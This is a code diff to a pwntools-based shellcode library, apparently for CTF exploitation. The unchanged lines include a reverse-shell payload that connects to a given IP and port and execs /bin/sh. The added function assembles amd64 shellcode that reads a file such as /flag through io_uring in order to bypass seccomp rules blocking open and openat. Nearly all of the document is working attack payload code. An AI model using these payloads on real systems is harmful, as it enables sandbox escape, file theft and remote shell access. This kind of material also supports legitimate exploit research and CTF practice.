@@ -10,7 +10,7 @@
 
 import sys
 
-from pwn import pack
+from pwn import pack, asm, context
 
 __all__ = [
     "ShellcodeMall",
@@ -133,6 +133,275 @@ class ShellcodeMall:
             return b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" + \
                 port.to_bytes(2, "big") + int_ip.to_bytes(4, "big") + \
                 b"\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x54\x5f\x0f\x05"
+
+        @staticmethod
+        def io_uring_cat_flag(filename: str = "/flag", fd: int = 1) -> bytes:
+            """Read a file via io_uring and write to fd, bypassing seccomp that
+            blocks open/openat/openat2. Uses io_uring OPENAT + READ + WRITE SQEs.
+
+            Args:
+                filename: Path to read (default "/flag")
+                fd: File descriptor to write output to (default 1 = stdout)
+
+            Returns:
+                Assembled shellcode bytes (amd64)
+            """
+            old_ctx = context.arch
+            context.arch = "amd64"
+            # Encode filename with null terminator, pad to 8-byte alignment
+            fname_bytes = filename.encode() + b"\x00"
+            fname_len = len(fname_bytes)
+
+            sc = f"""
+            /* === io_uring cat flag shellcode === */
+            /* Uses io_uring to: OPENAT(filename) -> READ -> WRITE({fd}) */
+
+            push rbp
+            sub rsp, 0x188
+            mov rbp, rsp
+
+            /* Store filename on stack at [rsp+0x6a] */
+            lea r12, [rsp+0x70]     /* r12 = buffer for read data */
+            """
+
+            # Write filename bytes to stack at [rsp+0x6a]
+            offset = 0x6a
+            for i in range(0, fname_len, 8):
+                chunk = fname_bytes[i:i+8].ljust(8, b'\x00')
+                val = int.from_bytes(chunk, 'little')
+                if i + 8 <= fname_len or fname_len - i >= 8:
+                    sc += f"    mov rax, {hex(val)}\n"
+                    sc += f"    mov QWORD PTR [rsp+{hex(offset + i)}], rax\n"
+                else:
+                    # Partial write for remaining bytes
+                    remaining = fname_len - i
+                    if remaining >= 4:
+                        sc += f"    mov DWORD PTR [rsp+{hex(offset + i)}], {hex(val & 0xffffffff)}\n"
+                        if remaining > 4:
+                            sc += f"    mov WORD PTR [rsp+{hex(offset + i + 4)}], {hex((val >> 32) & 0xffff)}\n"
+                    elif remaining >= 2:
+                        sc += f"    mov WORD PTR [rsp+{hex(offset + i)}], {hex(val & 0xffff)}\n"
+                        if remaining > 2:
+                            sc += f"    mov BYTE PTR [rsp+{hex(offset + i + 2)}], {hex((val >> 16) & 0xff)}\n"
+                    else:
+                        sc += f"    mov BYTE PTR [rsp+{hex(offset + i)}], {hex(val & 0xff)}\n"
+
+            sc += f"""
+            /* Zero out the buffer area */
+            xor eax, eax
+            mov ecx, 0x20
+            mov rdi, r12
+            rep stosq
+
+            /* Zero out the uring struct area */
+            mov ecx, 0xd
+            mov rdi, rbp
+            rep stosq
+
+            /* app_setup_uring(rbp) */
+            mov rdi, rbp
+            call app_setup_uring
+
+            /* OPENAT: do_io_uring(opcode=0x12, fd=AT_FDCWD, buf=filename, len=0, uring=rbp) */
+            xor ecx, ecx
+            lea rdx, [rsp+0x6a]
+            mov r8, rbp
+            mov esi, 0xffffff9c       /* AT_FDCWD */
+            mov edi, 0x12             /* IORING_OP_OPENAT */
+            call do_io_uring
+            call sleep
+
+            /* READ: do_io_uring(opcode=0x16, fd=result, buf=r12, len=0x100, uring=rbp) */
+            mov r8, rbp
+            mov ecx, 0x100
+            mov rdx, r12
+            mov esi, 0x4              /* fd from openat result (fixed file slot) */
+            mov edi, 0x16             /* IORING_OP_READ */
+            call do_io_uring
+            call sleep
+
+            /* WRITE: do_io_uring(opcode=0x17, fd={fd}, buf=r12, len=0x100, uring=rbp) */
+            mov edi, 0x17             /* IORING_OP_WRITE */
+            mov r8, rbp
+            mov rdx, r12
+            mov ecx, 0x100
+            mov esi, {fd}
+            call do_io_uring
+            call sleep
+
+            /* exit(0) */
+            xor edi, edi
+            mov eax, 60
+            syscall
+
+            /* === helper functions === */
+
+            memset:
+                mov eax, esi
+                mov rcx, rdx
+                rep stosb
+                ret
+
+            io_uring_setup:
+                mov eax, 0x1a9
+                syscall
+                ret
+
+            io_uring_enter:
+                push r8
+                push r9
+                push r10
+                mov eax, 0x1aa
+                mov r10, rcx
+                xor r8, r8
+                xor r9, r9
+                syscall
+                pop r10
+                pop r9
+                pop r8
+                ret
+
+            mmap:
+                push r10
+                mov eax, 0x9
+                mov r10, rcx
+                syscall
+                pop r10
+                ret
+
+            sleep:
+                sub rsp, 0x18
+                mov rdi, rsp
+                mov QWORD PTR [rsp], 0x1
+                mov QWORD PTR [rsp+0x8], 0x0
+                mov rsi, rdi
+                mov eax, 0x23
+                syscall
+                add rsp, 0x18
+                ret
+
+            app_setup_uring:
+                push r12
+                xor eax, eax
+                mov ecx, 0x1e
+                push rbp
+                push rbx
+                mov rbx, rdi
+                add rsp, 0xffffffffffffff80
+                lea rsi, [rsp+0x8]
+                mov rdi, rsi
+                rep stosd
+                mov edi, 0x3
+                call io_uring_setup
+                mov edx, DWORD PTR [rsp+0x8]
+                mov r12d, DWORD PTR [rsp+0xc]
+                xor edi, edi
+                mov DWORD PTR [rbx], eax
+                mov r8d, eax
+                mov eax, DWORD PTR [rsp+0x48]
+                xor r9d, r9d
+                mov ecx, 0x8001
+                shl r12d, 0x4
+                add r12d, DWORD PTR [rsp+0x6c]
+                lea esi, [rax+rdx*4]
+                mov edx, 0x3
+                movsxd rsi, esi
+                call mmap
+                mov r8d, DWORD PTR [rbx]
+                movsxd rsi, r12d
+                mov ecx, 0x8001
+                mov r9d, 0x8000000
+                mov edx, 0x3
+                xor edi, edi
+                mov rbp, rax
+                call mmap
+                mov esi, DWORD PTR [rsp+0x8]
+                mov r8d, DWORD PTR [rbx]
+                xor edi, edi
+                mov r12, rax
+                mov eax, DWORD PTR [rsp+0x30]
+                mov r9d, 0x10000000
+                mov ecx, 0x8001
+                shl rsi, 0x6
+                mov edx, 0x3
+                add rax, rbp
+                mov QWORD PTR [rbx+0x8], rax
+                mov eax, DWORD PTR [rsp+0x34]
+                add rax, rbp
+                mov QWORD PTR [rbx+0x10], rax
+                mov eax, DWORD PTR [rsp+0x38]
+                add rax, rbp
+                mov QWORD PTR [rbx+0x18], rax
+                mov eax, DWORD PTR [rsp+0x3c]
+                add rax, rbp
+                mov QWORD PTR [rbx+0x20], rax
+                mov eax, DWORD PTR [rsp+0x40]
+                add rax, rbp
+                mov QWORD PTR [rbx+0x28], rax
+                mov eax, DWORD PTR [rsp+0x48]
+                add rbp, rax
+                mov QWORD PTR [rbx+0x30], rbp
+                call mmap
+                mov QWORD PTR [rbx+0x38], rax
+                mov eax, DWORD PTR [rsp+0x58]
+                add rax, r12
+                mov QWORD PTR [rbx+0x40], rax
+                mov eax, DWORD PTR [rsp+0x5c]
+                add rax, r12
+                mov QWORD PTR [rbx+0x48], rax
+                mov eax, DWORD PTR [rsp+0x60]
+                add rax, r12
+                mov QWORD PTR [rbx+0x50], rax
+                mov eax, DWORD PTR [rsp+0x64]
+                add rax, r12
+                mov QWORD PTR [rbx+0x58], rax
+                mov eax, DWORD PTR [rsp+0x6c]
+                add r12, rax
+                xor eax, eax
+                mov QWORD PTR [rbx+0x60], r12
+                sub rsp, 0xffffffffffffff80
+                pop rbx
+                pop rbp
+                pop r12
+                ret
+
+            do_io_uring:
+                push rax
+                mov rax, QWORD PTR [r8+0x10]
+                mov r9d, esi
+                mov rsi, rdx
+                mov edx, DWORD PTR [rax]
+                mov rax, QWORD PTR [r8+0x18]
+                mov r11d, DWORD PTR [rax]
+                and r11d, edx
+                inc edx
+                mov r10d, r11d
+                mov rax, r10
+                shl rax, 0x6
+                add rax, QWORD PTR [r8+0x38]
+                mov BYTE PTR [rax+0x1], 0x0
+                mov BYTE PTR [rax], dil
+                mov DWORD PTR [rax+0x4], r9d
+                mov QWORD PTR [rax+0x10], rsi
+                mov DWORD PTR [rax+0x18], ecx
+                mov QWORD PTR [rax+0x8], 0x0
+                mov QWORD PTR [rax+0x20], 0x0
+                mov rax, QWORD PTR [r8+0x30]
+                mov DWORD PTR [rax+r10*4], r11d
+                mov rax, QWORD PTR [r8+0x10]
+                mov DWORD PTR [rax], edx
+                mov edi, DWORD PTR [r8]
+                mov edx, 0x1
+                mov ecx, 0x1
+                mov esi, 0x1
+                call io_uring_enter
+                xor eax, eax
+                pop rdx
+                ret
+            """
+            result = asm(sc)
+            context.arch = old_ctx
+            return result
 
     class i386:
         __all_execve_bin_sh = {
